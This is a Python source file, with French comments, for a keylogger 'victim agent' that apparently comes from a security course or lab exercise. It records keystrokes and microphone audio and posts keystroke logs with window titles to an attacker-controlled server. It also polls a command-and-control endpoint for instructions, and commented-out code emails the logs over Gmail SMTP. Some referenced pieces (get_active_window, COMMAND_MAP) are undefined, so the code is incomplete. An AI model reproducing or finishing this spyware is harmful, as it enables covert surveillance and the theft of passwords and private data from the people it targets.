import os
import smtplib
import threading
import wave
import json
import uuid
import requests
import time
from datetime import datetime
import sounddevice as sd
from pynput import keyboard
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

ATTACKER_IP = "192.168.30.130" 
TARGET_INGEST_URL = f"http://{ATTACKER_IP}:8080/ingest"
TARGET_C2_URL = f"http://{ATTACKER_IP}:8080/command/"
C2_POLLING_INTERVAL = 10  # Interroge le serveur toutes les 10 secondes

# Génère l'ID unique au démarrage du script
VICTIM_ID = str(uuid.uuid4())

class Keylogger:
    def __init__(self, interval=60):
        self.log_file = "keylog.txt"
        self.audio_file = "sound.wav"
        self.interval = interval
        #self.email = email
        self.keystrokes_buffer = ""
        #self.password = password

    def on_press(self, key):
        try:
            with open(self.log_file, 'a') as f:
                f.write(key.char)
        except AttributeError:
            with open(self.log_file, 'a') as f:
                if str(key) == "Key.space":
                    f.write(" ")
                elif str(key) == "Key.enter":
                    f.write(" \n")
                elif str(key) in ["Key.right", "Key.left", "Key.up", "Key.down",
                                 "Key.shift", "Key.shift_r", "Key.ctrl_l",
                                 "Key.ctrl_r", "Key.alt_l", "Key.alt_r", "Key.tab"]:
                    f.write(" ")
                elif str(key) == "Key.backspace":
                    f.seek(f.tell() - 1, os.SEEK_SET)
                    f.truncate()
                else:
                    f.write(f'[ {str(key)} ]')
    def start_capture(self):
        """Active la capture de frappes."""
        self.is_capturing = True
        print("[C2] Capture ACTIVER.")
    
    def stop_capture(self):
        """Désactive la capture de frappes."""
        self.is_capturing = False
        print("[C2] Capture DÉSACTIVER.")
        
    def flush_logs(self):
        """Force l'envoi immédiat du buffer et le vide."""
        print("[C2] Flushing du buffer demandé...")
        if self.keystrokes_buffer:
            self.send_report(force=True)
        else:
            print("[C2] Buffer vide.")

    # def send_mail(self, filename):
    #     msg = MIMEMultipart()
    #     msg['From'] = self.email
    #     msg['To'] = self.email
    #     msg['Subject'] = "Log File"
    #     msg.attach(MIMEText("See attachment", 'plain'))

    #     with open(filename, "rb") as attachment:
    #         p = MIMEBase('application', 'octet-stream')
    #         p.set_payload(attachment.read())
    #         encoders.encode_base64(p)
    #         p.add_header('Content-Disposition', f"attachment; filename={filename}")
    #         msg.attach(p)

    #     with smtplib.SMTP('smtp.gmail.com', 587) as server:
    #         server.starttls()
    #         server.login(self.email, self.password)
    #         server.send_message(msg)

    def create_json_payload(self, keystrokes):
        """Exigence 3: Normalise et encode les données en JSON."""
        return json.dumps({
            "victim_id": VICTIM_ID,
            "timestamp": datetime.now().isoformat(),
            "window_title": get_active_window(), 
            "keystrokes": keystrokes
        })

    def exfiltrate_data(self, json_payload, max_retries=3):
        """Exigence 3: Envoi HTTP POST avec résilience (retry)."""
        for attempt in range(max_retries):
            try:
                response = requests.post(
                    TARGET_INGEST_URL,
                    data=json_payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                if response.status_code == 200:
                    return True 
            except requests.exceptions.RequestException:
                pass 
            time.sleep(5)
        return False

    def send_report(self, force=False):
        """Envoie le buffer si l'intervalle est atteint ou si 'force' est True."""
        if force or self.keystrokes_buffer:
            payload = self.create_json_payload(self.keystrokes_buffer)
            
            if self.exfiltrate_data(payload):
                self.keystrokes_buffer = "" # Vider si succès
        
        if not force:
            # Planifie le prochain rapport automatique
            threading.Timer(self.interval, self.send_report).start()

    # --- NOUVEAU : Logique de Polling C2 ---
    def c2_poll_for_command(self):
        """Interroge l'Attaquant pour une commande C2 en attente."""
        try:
            # Requête vers l'endpoint de commande spécifique à cette victime
            response = requests.get(TARGET_C2_URL + VICTIM_ID, timeout=5)
            
            if response.status_code == 200:

                data = response.json()
                command = data.get("cmd")
                
                if command and command != "none":
                    print(f"\n[C2] Commande reçue : {command}")
                    
                    # Exécuter la commande
                    action = self.COMMAND_MAP.get(command)
                    if action:
                        action()
                    
                    # Nettoyer la commande sur le serveur Attaquant pour éviter la répétition
                    requests.post(TARGET_C2_URL + VICTIM_ID + "/clear", timeout=1) 

        except requests.exceptions.RequestException:
            # Silence les erreurs réseau de Polling
            pass
        except json.JSONDecodeError:
            print("[C2] Réponse de commande non JSON.")

        # Planifie le prochain polling
        threading.Timer(C2_POLLING_INTERVAL, self.c2_poll_for_command).start()

    def record_audio(self):
        fs = 44100
        seconds = self.interval

        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, blocking=True)

        # convert float32 → int16
        audio_int16 = (myrecording * 32767).astype('int16')

        with wave.open(self.audio_file, 'wb') as obj:
            obj.setnchannels(1)
            obj.setsampwidth(2)   # 16 bits
            obj.setframerate(fs)
            obj.writeframes(audio_int16.tobytes())

    # def report(self):
    #     if os.path.exists(self.log_file):
    #         self.send_mail(self.log_file)
    #         os.remove(self.log_file)

    #     self.record_audio()
    #     if os.path.exists(self.audio_file):
    #         self.send_mail(self.audio_file)
    #         os.remove(self.audio_file)

    #     threading.Timer(self.interval, self.report).start()

    # def run(self):
    #     listener = keyboard.Listener(on_press=self.on_press)
    #     listener.start()
    #     self.report()
    #     listener.join()

    def run(self):
        print(f"Agent Victime démarré. ID: {VICTIM_ID}")
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        self.send_report()
        self.c2_poll_for_command()  # Démarre le polling C2
        listener.join()

if __name__ == "__main__":
    keylogger = Keylogger(
        interval=60,  
    )
    keylogger.run()
